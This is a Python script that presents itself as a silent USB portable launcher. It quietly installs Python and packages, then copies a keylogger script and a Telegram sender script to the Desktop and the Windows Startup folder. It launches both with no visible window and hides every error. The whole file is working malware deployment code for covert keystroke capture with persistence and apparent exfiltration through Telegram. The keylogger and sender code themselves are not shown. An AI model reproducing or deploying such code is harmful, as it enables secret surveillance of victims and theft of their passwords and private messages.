# launcher.pyw - Fully Silent USB Portable Launcher + Auto-Start on Every Login
import os
import subprocess
import sys
import time
import shutil
from pathlib import Path

# --- Get paths ---
usb_dir = Path(__file__).parent.resolve()  # USB folder
desktop = Path(os.path.expanduser("~")) / "Desktop"
startup_folder = Path(os.environ['APPDATA']) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"

keylogger_file = usb_dir / "Personal_KeyLogger.pyw"
sender_file = usb_dir / "Telegram_Sender.pyw"

dest_keylogger_desktop = desktop / "Personal_KeyLogger.pyw"
dest_sender_desktop = desktop / "Telegram_Sender.pyw"

# Paths for Startup (we copy .pyw directly — pythonw will run them hidden)
dest_keylogger_startup = startup_folder / "Personal_KeyLogger.pyw"
dest_sender_startup = startup_folder / "Telegram_Sender.pyw"

def run_command(cmd, shell=True):
    try:
        subprocess.check_call(cmd, shell=shell, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False

def install_python_and_packages():
    if not run_command("python -V"):
        run_command('powershell -Command "winget install --id Python.Python.3.12 -e --source winget --silent --accept-package-agreements --accept-source-agreements"')
        run_command('powershell -Command "$env:Path = [System.Environment]::GetEnvironmentVariable(\'Path\',\'Machine\') + \';\' + [System.Environment]::GetEnvironmentVariable(\'Path\',\'User\')"')

    run_command("python -m pip install --upgrade pip")
    run_command("python -m pip install pynput requests watchdog --user")

# --- Main (completely silent) ---
try:
    # 1. Install Python + packages if needed
    install_python_and_packages()

    # 2. Copy to Desktop
    shutil.copy2(keylogger_file, dest_keylogger_desktop)
    shutil.copy2(sender_file, dest_sender_desktop)

    # 3. Copy to Startup folder for auto-run on every login
    shutil.copy2(keylogger_file, dest_keylogger_startup)
    shutil.copy2(sender_file, dest_sender_startup)

    # 4. Start KeyLogger immediately (hidden)
    subprocess.Popen(["pythonw.exe", str(dest_keylogger_desktop)],
                     creationflags=subprocess.CREATE_NO_WINDOW)

    # 5. Wait 5 seconds
    time.sleep(5)

    # 6. Start Telegram Sender immediately (hidden)
    subprocess.Popen(["pythonw.exe", str(dest_sender_desktop)],
                     creationflags=subprocess.CREATE_NO_WINDOW)

except:
    pass  # Fully silent — even on error

# Exit silently
sys.exit(0)
